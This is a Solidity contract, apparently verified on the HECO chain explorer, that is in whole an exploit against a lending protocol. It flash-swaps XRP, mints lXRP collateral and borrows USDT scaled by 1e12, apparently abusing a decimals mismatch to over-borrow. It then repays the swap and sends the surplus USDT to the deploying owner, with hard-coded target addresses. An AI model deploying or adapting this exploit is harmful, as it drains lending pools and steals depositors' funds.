/**
 *Submitted for verification at hecoinfo.com on 2022-05-16
*/

pragma solidity ^0.8.0;

interface IUniswapV2Router02 {
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IToken {
    function comptroller() external view returns (address);
    function mint(uint mintAmount) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient,uint256 amount ) external returns (bool);
}


contract Foo {

    uint constant MAX_INT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    IUniswapV2Pair constant pair = IUniswapV2Pair(0x9dbe263c92faaEC700980089E73d2764614Ed8EE);
    IUniswapV2Router02 public router = IUniswapV2Router02(0xED7d5F38C79115ca12fe6C0041abb22F0A06C300);
    address constant xrp = 0xA2F3C2446a3E20049708838a779Ff8782cE6645a;
    address constant usdt = 0xa71EdC38d189767582C38A3145b5873052c3e47a;
    address constant lxrp = 0x366CE3630bC2691Bbf3eB29DD6E4DD3D11c25E11;
    address constant lusdt = 0xc502F3f6f1b71CB7d856E70B574D27d942C2993C;
    address public owner;


    constructor() {
        owner = msg.sender;
    }


    function exec(uint amount) public{
        uint amount0 = amount;
        uint amount1 = 0;
        bytes memory data = abi.encode("");
        pair.swap(amount0, amount1, address(this), data);
    }

    function hswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        _callback(sender,amount0,amount1,data);
    }

    function _callback(address sender, uint amount0, uint amount1, bytes calldata data) internal {

        uint amount = amount0;

        IERC20(xrp).approve(lxrp,MAX_INT);
        IToken(lxrp).mint(amount);

        IComptroller comptroller = IComptroller(IToken(lxrp).comptroller());
        address[] memory markets = new address[](1);
        markets[0] = lxrp;
        comptroller.enterMarkets(markets);

        (,uint liquidate,) = comptroller.getAccountLiquidity(address(this));
        uint borrowAmount = (liquidate - 1000) * 1e12;
        IToken(lusdt).borrow(borrowAmount);
        
        (uint reserve0, uint reserve1,) = pair.getReserves();
        (uint reserveIn, uint reserveOut) = pair.token0() == xrp ? (reserve1, reserve0) : (reserve0, reserve1);
        uint amountRequired = router.getAmountIn(amount, reserveIn, reserveOut);
        IERC20(usdt).transfer(address(pair), amountRequired);

        IERC20(usdt).transfer(payable(owner), IERC20(usdt).balanceOf(address(this)));
    }

}